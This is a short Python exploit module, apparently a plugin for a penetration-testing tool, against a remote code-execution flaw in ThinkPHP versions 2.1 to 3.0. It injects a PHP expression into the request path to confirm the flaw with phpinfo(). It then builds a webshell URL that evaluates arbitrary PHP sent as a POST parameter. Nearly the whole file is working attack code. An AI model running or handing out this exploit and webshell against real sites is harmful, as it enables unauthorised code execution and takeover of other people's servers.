#!/usr/bin/env python
# -*- coding:utf-8 -*-

from lib import logger
from lib import requests

author = "Chu <root@sh3ll.me>"
scope = "ThinkPHP 2.1,2.2,3.0"
description = "Dispatcher.class.php 代码执行"
reference = "http://sebug.net/vuldb/ssvid-60054"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]


def exploit(URL):
    url = URL + "/index.php/module/aciton/param1/${@phpinfo()}"
    logger.process("Requesting target site")
    r = requests.get(url, timeout=5)
    r.close()
    if "<title>phpinfo()</title>" in r.text:
        logger.success("Exploitable!")
        logger.success("Phpinfo: %s" % url)
        url = url.replace("@phpinfo()", "@print(eval($_POST[chu]))")
        logger.success("Webshell: %s" % url)
        return url
